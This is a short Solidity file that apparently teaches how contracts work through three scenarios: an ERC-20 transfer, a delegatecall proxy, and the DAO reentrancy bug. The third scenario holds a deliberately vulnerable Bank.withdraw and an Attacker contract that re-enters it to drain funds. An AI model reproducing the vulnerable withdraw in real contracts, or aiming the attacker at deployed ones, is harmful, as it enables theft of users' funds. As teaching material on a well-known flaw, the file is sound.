// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Scenario 1: a real ERC-20 transfer — what a token transfer compiles to.
contract Token {
    string public name = "DemoToken";
    mapping(address => uint256) public balanceOf;
    event Transfer(address indexed from, address indexed to, uint256 amount);

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
}

// Scenario 2: the upgradeable-contract trick — a proxy that delegates
// into a logic contract but keeps all state in its own cabinet.
contract Logic {
    address private _pad;                     // slot 0 — keeps Proxy.impl intact
    uint256 public count;                     // slot 1
    function inc() external { count += 1; }
}

contract Proxy {
    address public impl;                    // slot 0
    fallback() external payable {
        (bool ok, bytes memory r) = impl.delegatecall(msg.data);
        require(ok, "delegate failed");
        assembly { return(add(r, 32), mload(r)) }
    }
}

// Scenario 3: the DAO bug — withdraw sends the cash BEFORE updating the
// ledger, so the attacker's callback re-enters and drains it again.
contract Bank {
    mapping(address => uint256) public credit;
    function withdraw() external {
        uint256 c = credit[msg.sender];
        (bool ok,) = msg.sender.call{value: c}("");   // phone first…
        require(ok, "send failed");
        credit[msg.sender] = 0;                        // …ledger second (the bug)
    }
}

contract Attacker {
    Bank public bank;                                   // slot 0
    uint256 public n;                                   // slot 1
    function pwn() external { bank.withdraw(); }
    receive() external payable {
        if (n < 2) { n += 1; bank.withdraw(); }         // re-enter while ledger stale
    }
}
